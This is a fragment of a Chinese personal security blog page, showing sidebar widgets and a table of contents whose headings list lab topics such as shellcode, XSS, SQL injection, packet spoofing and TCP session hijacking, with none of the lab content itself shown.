margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/11/27/20231127-vulhub-DC/" title="vulhub DC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129133005.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-27</div><div class="title">vulhub DC</div></div></a></div><div><a href="/2023/11/29/20231129-OWASP-TOP10%E9%9D%B6%E5%9C%BA/" title="OWASP TOP10靶场"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129131453.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-11-29</div><div class="title">OWASP TOP10靶场</div></div></a></div><div><a href="/2023/01/02/20240102-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" title="网络空间安全技术"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129085559.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-01-02</div><div class="title">网络空间安全技术</div></div></a></div><div><a href="/2024/12/02/SCUCTF2023/" title="SCUCTF2023"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://i.ytimg.com/vi/8ev9ZX9J45A/maxresdefault.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-12-02</div><div class="title">SCUCTF2023</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20240112195732.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/01/15/b34c4b29baf17.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">虚心向各位学习<b style="color:#fff">开发、安全</b>相关的问题和看法。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这里都是鄙人的一些拙见<b style="color:#fff">请诸位指教</b>。<b style="color:#fff"></div> <div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">Feel free to contact me</b>.</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Johnny</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/jieyugit" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="mailto:uiejohnny@gmail.com" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-number">1.</span> <span class="toc-text">端口扫描工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ICMP%E5%8D%8F%E8%AE%AE%E6%8E%A2%E6%B5%8B%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF"><span class="toc-number">1.1.</span> <span class="toc-text">使用ICMP协议探测主机是否开启</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">1.1.2.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8A%E8%BF%9E%E6%8E%A5%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">半连接扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FIN"><span class="toc-number">1.3.</span> <span class="toc-text">FIN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NULL"><span class="toc-number">1.4.</span> <span class="toc-text">NULL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Xmas"><span class="toc-number">1.5.</span> <span class="toc-text">Xmas</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FIN-NULL-Xmas%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">1.6.</span> <span class="toc-text">FIN NULL Xmas存在的问题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MD5%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C"><span class="toc-number">2.</span> <span class="toc-text">MD5碰撞攻击实验</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task1"><span class="toc-number">2.1.</span> <span class="toc-text">Task1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Question-1-If-the-length-of-your-prefix-file-is-not-multiple-of-64-what-is-going-to-happen"><span class="toc-number">2.1.1.</span> <span class="toc-text">Question 1. If the length of your prefix file is not multiple of 64, what is going to happen?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Question-2-Create-a-prefix-file-with-exactly-64-bytes-and-run-the-collision-tool-again-and-see-what-happens"><span class="toc-number">2.1.2.</span> <span class="toc-text">Question 2. Create a prefix file with exactly 64 bytes, and run the collision tool again, and see what happens.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Are-the-data-128-bytes-generated-by-md5collgen-completely-different-for-the-two-output-files-Please-identify-all-the-bytes-that-are-different"><span class="toc-number">2.1.3.</span> <span class="toc-text">Are the data (128 bytes) generated by md5collgen completely different for the two output files? Please identify all the bytes that are different.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Understanding-MD5%E2%80%99s-Property"><span class="toc-number">2.2.</span> <span class="toc-text">Task 2: Understanding MD5’s Property</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Generating-Two-Executable-Files-with-the-Same-MD5-Hash"><span class="toc-number">2.3.</span> <span class="toc-text">Task 3: Generating Two Executable Files with the Same MD5 Hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Making-the-Two-Programs-Behave-Differently"><span class="toc-number">2.4.</span> <span class="toc-text">Task 4: Making the Two Programs Behave Differently</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shellcode-Development-Lab"><span class="toc-number">3.</span> <span class="toc-text">Shellcode Development Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-a-The-Entire-Process"><span class="toc-number">3.1.</span> <span class="toc-text">Task 1.a: The Entire Process</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Compiling-to-object-code"><span class="toc-number">3.1.1.</span> <span class="toc-text">Compiling to object code.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linking-to-generate-final-binary"><span class="toc-number">3.1.2.</span> <span class="toc-text">Linking to generate final binary.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-the-machine-code"><span class="toc-number">3.1.3.</span> <span class="toc-text">Getting the machine code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-the-shellcode-in-attacking-code"><span class="toc-number">3.1.4.</span> <span class="toc-text">Using the shellcode in attacking code.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-b-Eliminating-Zeros-from-the-Code"><span class="toc-number">3.2.</span> <span class="toc-text">Task 1.b. Eliminating Zeros from the Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-c-Providing-Arguments-for-System-Calls"><span class="toc-number">3.3.</span> <span class="toc-text">Task 1.c. Providing Arguments for System Calls</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-d-Providing-Environment-Variables-for-execve"><span class="toc-number">3.4.</span> <span class="toc-text">Task 1.d. Providing Environment Variables for execve()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Using-Code-Segment"><span class="toc-number">3.5.</span> <span class="toc-text">Task 2: Using Code Segment</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task1-1"><span class="toc-number">3.5.1.</span> <span class="toc-text">Task1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task2"><span class="toc-number">3.5.2.</span> <span class="toc-text">Task2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task3"><span class="toc-number">3.5.3.</span> <span class="toc-text">Task3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Environment-Variable-and-Set-UID-Program-Lab"><span class="toc-number">4.</span> <span class="toc-text">Environment Variable and Set-UID Program Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Manipulating-Environment-Variables"><span class="toc-number">4.1.</span> <span class="toc-text">Task 1: Manipulating Environment Variables</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><span class="toc-number">4.2.</span> <span class="toc-text">Task 2: Passing Environment Variables from Parent Process to Child Process</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step1"><span class="toc-number">4.2.1.</span> <span class="toc-text">Step1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step2"><span class="toc-number">4.2.2.</span> <span class="toc-text">Step2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step3"><span class="toc-number">4.2.3.</span> <span class="toc-text">Step3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Environment-Variables-and-execve"><span class="toc-number">4.3.</span> <span class="toc-text">Task 3: Environment Variables and execve()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step1-1"><span class="toc-number">4.3.1.</span> <span class="toc-text">Step1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step2-1"><span class="toc-number">4.3.2.</span> <span class="toc-text">Step2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step3-1"><span class="toc-number">4.3.3.</span> <span class="toc-text">Step3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Environment-Variables-and-system"><span class="toc-number">4.4.</span> <span class="toc-text">Task 4: Environment Variables and system()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Environment-Variable-and-Set-UID-Programs"><span class="toc-number">4.5.</span> <span class="toc-text">Task 5: Environment Variable and Set-UID Programs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step1-%E7%BC%96%E5%86%99%E7%A8%8B%E5%BA%8F"><span class="toc-number">4.5.1.</span> <span class="toc-text">Step1 编写程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step2-2"><span class="toc-number">4.6.</span> <span class="toc-text">Step2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step3-2"><span class="toc-number">4.6.1.</span> <span class="toc-text">Step3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><span class="toc-number">4.7.</span> <span class="toc-text">Task 6: The PATH Environment Variable and Set-UID Programs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E4%BB%BB%E6%84%8F%E7%BC%96%E5%86%99%E7%9A%84%E4%BB%A3%E7%A0%81"><span class="toc-number">4.7.1.</span> <span class="toc-text">运行任意编写的代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">4.7.2.</span> <span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><span class="toc-number">4.8.</span> <span class="toc-text">Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step1-2"><span class="toc-number">4.8.1.</span> <span class="toc-text">Step1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step2-3"><span class="toc-number">4.8.2.</span> <span class="toc-text">Step2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step3-3"><span class="toc-number">4.8.3.</span> <span class="toc-text">Step3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-8-Invoking-External-Programs-Using-system-versus-execve"><span class="toc-number">4.9.</span> <span class="toc-text">Task 8: Invoking External Programs Using system() versus execve()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-1"><span class="toc-number">4.9.1.</span> <span class="toc-text">Step 1:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step2-4"><span class="toc-number">4.9.2.</span> <span class="toc-text">Step2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-9-Capability-Leaking"><span class="toc-number">4.10.</span> <span class="toc-text">Task 9: Capability Leaking</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-Site-Scripting-XSS-Attack-Lab"><span class="toc-number">5.</span> <span class="toc-text">Cross-Site Scripting (XSS) Attack Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><span class="toc-number">5.1.</span> <span class="toc-text">Task 1: Posting a Malicious Message to Display an Alert Window</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><span class="toc-number">5.2.</span> <span class="toc-text">Task 2: Posting a Malicious Message to Display Cookies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Stealing-Cookies-from-the-Victim%E2%80%99s-Machine"><span class="toc-number">5.3.</span> <span class="toc-text">Task 3: Stealing Cookies from the Victim’s Machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Becoming-the-Victim%E2%80%99s-Friend"><span class="toc-number">5.4.</span> <span class="toc-text">Task 4: Becoming the Victim’s Friend</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Modifying-the-Victim%E2%80%99s-Profile"><span class="toc-number">5.5.</span> <span class="toc-text">Task 5: Modifying the Victim’s Profile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Writing-a-Self-Propagating-XSS-Worm"><span class="toc-number">5.6.</span> <span class="toc-text">Task 6: Writing a Self-Propagating XSS Worm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-7-Defeating-XSS-Attacks-Using-CSP"><span class="toc-number">5.7.</span> <span class="toc-text">Task 7: Defeating XSS Attacks Using CSP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Attack-Lab"><span class="toc-number">6.</span> <span class="toc-text">SQL Injection Attack Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Get-Familiar-with-SQL-Statements"><span class="toc-number">6.1.</span> <span class="toc-text">Task 1: Get Familiar with SQL Statements</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-SQL-Injection-Attack-on-SELECT-Statement"><span class="toc-number">6.2.</span> <span class="toc-text">Task 2: SQL Injection Attack on SELECT Statement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-1-SQL-Injection-Attack-from-webpage"><span class="toc-number">6.2.1.</span> <span class="toc-text">Task 2.1: SQL Injection Attack from webpage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-2-SQL-Injection-Attack-from-command-line"><span class="toc-number">6.2.2.</span> <span class="toc-text">Task 2.2: SQL Injection Attack from command line</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-3-Append-a-new-SQL-statement"><span class="toc-number">6.2.3.</span> <span class="toc-text">Task 2.3: Append a new SQL statement.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-SQL-Injection-Attack-on-UPDATE-Statement"><span class="toc-number">6.3.</span> <span class="toc-text">Task 3: SQL Injection Attack on UPDATE Statement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-3-1-Modify-your-own-salary"><span class="toc-number">6.3.1.</span> <span class="toc-text">Task 3.1: Modify your own salary.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-3-2-Modify-other-people%E2%80%99-salary"><span class="toc-number">6.3.2.</span> <span class="toc-text">Task 3.2: Modify other people’ salary.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-3-3-Modify-other-people%E2%80%99-password"><span class="toc-number">6.3.3.</span> <span class="toc-text">Task 3.3: Modify other people’ password.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Countermeasure-%E2%80%94-Prepared-Statement"><span class="toc-number">6.4.</span> <span class="toc-text">Task 4: Countermeasure — Prepared Statement</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Packet-Sniffing-and-Spoofing-Lab"><span class="toc-number">7.</span> <span class="toc-text">Packet Sniffing and Spoofing Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets"><span class="toc-number">7.1.</span> <span class="toc-text">Lab Task Set 1: Using Scapy to Sniff and Spoof Packets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-1-Sniffing-Packets"><span class="toc-number">7.1.1.</span> <span class="toc-text">Task 1.1: Sniffing Packets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-1-1A"><span class="toc-number">7.1.1.1.</span> <span class="toc-text">Task 1.1A</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-1-1B"><span class="toc-number">7.1.1.2.</span> <span class="toc-text">Task 1.1B</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-2-Spoofing-ICMP-Packets"><span class="toc-number">7.1.2.</span> <span class="toc-text">Task 1.2: Spoofing ICMP Packets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-3-Traceroute"><span class="toc-number">7.1.3.</span> <span class="toc-text">Task 1.3: Traceroute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-4-Sniffing-and-then-Spoofing"><span class="toc-number">7.1.4.</span> <span class="toc-text">Task 1.4: Sniffing and-then Spoofing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><span class="toc-number">7.2.</span> <span class="toc-text">Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-1A-Understanding-How-a-Sniffer-Works"><span class="toc-number">7.2.1.</span> <span class="toc-text">Task 2.1A: Understanding How a Sniffer Works</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-1B-Writing-Filters"><span class="toc-number">7.2.2.</span> <span class="toc-text">Task 2.1B: Writing Filters</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-1C-Sniffing-Passwords"><span class="toc-number">7.2.3.</span> <span class="toc-text">Task 2.1C: Sniffing Passwords.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-2-Spoofing"><span class="toc-number">7.3.</span> <span class="toc-text">Task 2.2: Spoofing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-2A-Write-a-spoofing-program"><span class="toc-number">7.3.1.</span> <span class="toc-text">Task 2.2A: Write a spoofing program.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-2B-Spoof-an-ICMP-Echo-Request"><span class="toc-number">7.3.2.</span> <span class="toc-text">Task 2.2B: Spoof an ICMP Echo Request.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Question-4-Can-you-set-the-IP-packet-length-field-to-an-arbitrary-value-regardless-of-how-big-the-actual-packet-is"><span class="toc-number">7.3.3.</span> <span class="toc-text">Question 4. Can you set the IP packet length field to an arbitrary value, regardless of how big the actual packet is?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Question-5-Using-the-raw-socket-programming-do-you-have-to-calculate-the-checksum-for-the-IP-header"><span class="toc-number">7.3.4.</span> <span class="toc-text">Question 5. Using the raw socket programming, do you have to calculate the checksum for the IP header?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Question-6-Why-do-you-need-the-root-privilege-to-run-the-programs-that-use-raw-sockets-Where-does-the-program-fail-if-executed-without-the-root-privilege"><span class="toc-number">7.3.5.</span> <span class="toc-text">Question 6. Why do you need the root privilege to run the programs that use raw sockets? Where does the program fail if executed without the root privilege?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-3-Sniff-and-then-Spoof"><span class="toc-number">7.4.</span> <span class="toc-text">Task 2.3: Sniff and then Spoof</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TCP-IP-Attack-Lab"><span class="toc-number">8.</span> <span class="toc-text">TCP&#x2F;IP Attack Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-SYN-Flooding-Attack"><span class="toc-number">8.1.</span> <span class="toc-text">Task 1: SYN Flooding Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-1-Launching-the-Attack-Using-Python"><span class="toc-number">8.1.1.</span> <span class="toc-text">Task 1.1: Launching the Attack Using Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-2-Launch-the-Attack-Using-C"><span class="toc-number">8.1.2.</span> <span class="toc-text">Task 1.2: Launch the Attack Using C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-3-Enable-the-SYN-Cookie-Countermeasure"><span class="toc-number">8.1.3.</span> <span class="toc-text">Task 1.3 Enable the SYN Cookie Countermeasure</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-TCP-RST-Attacks-on-telnet-Connections"><span class="toc-number">8.2.</span> <span class="toc-text">Task 2: TCP RST Attacks on telnet Connections</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-TCP-Session-Hijacking"><span class="toc-number">8.3.</span> <span class="toc-text">Task 3: TCP Session Hijacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><span class="toc-number">8.4.</span> <span class="toc-text">Task 4: Creating Reverse Shell using TCP Session Hijacking</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/12/02/SCUCTF2023/" title="SCUCTF2023"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://i.ytimg.com/vi/8ev9ZX9J45A/maxresdefault.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SCUCTF2023"/></a><div class="content"><a class="title" href="/2024/12/02/SCUCTF2023/" title="SCUCTF2023">SCUCTF2023</a><time datetime="2024-12-01T16:00:00.000Z" title="发表于 2024-12-02 00:00:00">2024-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/11/Nginx%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" title="Nginx 内存池"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://miro.medium.com/v2/resize:fit:1200/0*mjG1YdoT7xPcnznN.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx 内存池"/></a><div class="content"><a class="title" href="/2024/01/11/Nginx%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" title="Nginx 内存池">Nginx 内存池</a><time datetime="2024-01-10T16:00:00.000Z" title="发表于 2024-01-11 00:00:00">2024-01-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/25/20231225-Golang-channel/" title="Golang: channel"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231225030656.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Golang: channel"/></a><div class="content"><a class="title" href="/2023/12/25/20231225-Golang-channel/" title="Golang: channel">Golang: channel</a><time datetime="2023-12-24T16:00:00.000Z" title="发表于 2023-12-25 00:00:00">2023-12-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/29/20231129-OWASP-TOP10%E9%9D%B6%E5%9C%BA/" title="OWASP TOP10靶场"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129131453.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="OWASP TOP10靶场"/></a><div class="content"><a class="title" href="/2023/11/29/20231129-OWASP-TOP10%E9%9D%B6%E5%9C%BA/" title="OWASP TOP10靶场">OWASP TOP10靶场</a><time datetime="2023-11-29T15:42:40.000Z" title="发表于 2023-11-29 23:42:40">2023-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/27/20231127-vulhub-DC/" title="vulhub DC"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 